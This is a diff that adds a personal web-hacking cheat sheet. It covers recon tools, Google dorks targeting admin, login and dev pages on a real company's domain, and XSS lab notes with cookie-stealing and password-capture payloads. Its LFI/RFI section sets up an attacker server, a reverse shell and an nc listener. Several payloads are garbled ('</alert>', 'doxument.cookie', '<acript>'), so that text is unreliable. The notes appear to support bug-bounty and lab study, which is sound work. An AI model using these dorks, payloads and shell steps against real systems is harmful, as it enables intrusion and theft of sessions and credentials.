@@ -1,0 +1,153 @@
+---Recon:
+
+Certificate Transpsrency : Censys + crt.sh + shodan + amass + github + security trails
+Brute Force : massdns + amass + ffuf + Wfuzz + gobuster + dirsearch
+JS : linkfinder + JsParser + manually + Burp Extention
+frameWork : nmap + nuclei
+
+Dorking:
+site: gm.com -s 
+site: *gm.com
+site: gm.com*
+site: *gm.com*
+site: gm.com -s  -s -"search-careers"
+site: gm.com -s  -s -"search-careers" -www
+site: gm.com -s  -s -"search-careers" -www ext:php
+site: gm.com -s  -s -"search-careers" -www ext:zip
+site: gm.com -s  -s -"search-careers" -www inurl:admin
+site: gm.com -s  -s -"search-careers" -www inurl:login
+site: gm.com -s  -s -"search-careers" -www intitle:login
+site: gm.com -s  -s -"search-careers" -www title:login
+site: gm.com -s  -s -"search-careers" -www inurl:dev
+
+Script:
+https://github.com/sakibulalikhan/reconx
+https://github.com/TaurusOmar/reconbulk
+https://github.com/dirsoooo/Recon
+https://github.com/nahamsec/lazyrecon
+https://github.com/six2dez/reconftw
+https://github.com/alanbriangh/RECON-Scripts
+https://github.com/machine1337/recon-automation
+
+----Subdomain Enum:
+ffuf -u https://FUZZ.abc.com -w sublist.txt
+ffuf -u https://abc.com -H "Host: Fuzz.abc.com" -w subdomain.txt -fs [size]
+subfinder + sublist3r + amass + findomain + choas + assetfinder + subdomz + subdomainator + Online + dork + reconx + Oneliner
+
+----Oneliners:
+https://github.com/0xPugal/One-Liners
+https://github.com/twseptian/oneliner-bugbounty
+https://github.com/dwisiswant0/awesome-oneliner-bugbounty
+https://github.com/Elsfa7-110/Elsfa7110-Oneliner-bughunting
+https://gist.github.com/incogbyte/860e24950493fc4edf4b856efcdb0ab5
+https://github.com/bhavesh-pardhi/One-Liner
+https://github.com/venom26/recon/blob/master/new%20crt.sh%20one%20liner
+https://github.com/thecybertix/One-Liner-Collections
+
+------------------------------------------------------------------------------------------------------
+--XSS:
+
+Reflected XSS into HTML Content with nothing encoded:
+-- First find a search bar or finding a parameter in web url
+-- then try to simple XSS if pop up that means XSS
+
+Stored XSS into HTML context with nothing encoded:
+-- First find any kind of comment section or etc
+-- try to simple XSS and if it is blocked try to encoding also
+
+DOM XSS in documentwrite sink using source locationsearch:
+-- In the DOM you can not reflected in code but it will working
+-- try to simple XSS and if it is blocked try to encoding also
+
+DOM XSS in innerHTML sink using source locationsearch:
+-- you must find the id parameter and and you will also see it will connected to other part in JS
+-- Try to some common payload 
+
+DOM XSS in jQuery anchor href attribute sink using locationsearch source:
+-- First find any kind of button and hit it if you see that any kind of parameter will pop in url its a chance
+-- and then use payload javascript:alert(1) javascript:alert(document.cookie)
+
+DOM XSS in jQuery selector sink using a hashchange event:
+-- First it will autoscroll and you will find hash in the link and you may find hashvalue keyword in source code
+-- then you using #<img src=xxx onerror=print()> paylaod if it will execute that means it is XSS
+
+Reflected XSS into attribute with angle brackets HTMLencoded:
+-- First find any search bar or weblink parameter and try something
+-- if you see that some thing is reflecting then try to encode XSS with try without decode use onerror, img etc
+
+Stored XSS into anchor href attribute with double quotes HTMLencoded:
+-- Find Comment Section and then try payload javascript:alert(1)
+
+Reflected XSS into a JavaScript string with angle brackets HTML encoded:
+-- First find any search bar or weblink parameter and try something
+-- then try to XSS paylaods ;alert(0)//
+
+DOM XSS in documentwrite sink using source locationsearch inside a select elem:
+-- First read the source code and search script keyword
+-- then find the url parameter and try payload : 1&storeid="></select><img src=1 onerror=alert(1)>
+
+DOM XSS in AngularJS expression with angle brackets and double quotes HTMLencod:
+-- First find AngularJS and find the parameter in Weblink
+-- and Try to Exploit : {{$on.constructor('alert(1)')()}}
+
+Reflected DOM XSS:
+-- Find the Search bar and parameter and Try XSS Paylaod
+
+Stroed DOM XSS:
+-- Find the comment box and try XSS payload : <><img src=x onerror=alert(0)>
+
+Exploiting crosssite scripting to capture passwords:
+-- Find the comment box and go to https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting and find Auto-fill passwords capture and paste the paylaod
+
+Exploiting XSS to perform CSRF:
+-- Find the comment box and go to https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting and find Stealing CSRF tokens and paste the paylaod
+
+Reflected XSS into HTML context with most tags and attributes blocked:
+-- first find the search bar or parameter in weblink and try encode xss paylaods
+
+Reflected XSS into HTML context with all tags blocked except custom ones:
+-- Find the search bar or parameter in weblink and go to https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting and find custom tag or Blacklist bypass and paste the paylaod
+
+Reflected XSS with some SVG markup allowed:
+-- Some times script tag will not allow then we will svg tag
+-- suppose <svg><a></svg> and send to intruder and bruteforce it
+-- goto https://portswigger.net/web-security/cross-site-scripting/cheat-sheet and copy the all tags and bruteforce it
+-- then use those payload
+
+Reflected XSS into a template literal with angle brackets single double quotes:
+-- Try those Payload
+
+'-alert(1)-'
+';-alert(1)//
+\';alert(1)//
+${alert(1)}
+<script>alert(1)</alert>
+<script>alert(window.origin)</alert>
+<script>alert(doxument.cookie)</alert>
+<acript>print()</script>
+<img src=x onerror=alert("1")>
+<IMG src=x onerror=alert("1")>
+<Img src=x onerror=alert("1")>
+<iMG src=x onerror=alert("1")>
+<button onclick=alert("1")>
+
+Source : https://github.com/vernjan/web-security-academy/blob/master/XSS-contexts.md
+
+------------------------------------------------------------------------------------------------------
+
+LFI/RFI:
+-- First find the vulnerable parameter and Try LFI/RFI Payloads
+-- then try to RCE create your machine as a Server 
+	sudo python3 -m SimpleHTTPServer 80
+-- then your ip is attacker ip and downlaod pentestermonkey and edit ip and port. port is your ip address by ifconfig and set the port
+	nc -lvnp 8080
+-- ffuf -u http://10.10.10.84/x.php?file=../../../../../FUZZ LFI.txt
+
+------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
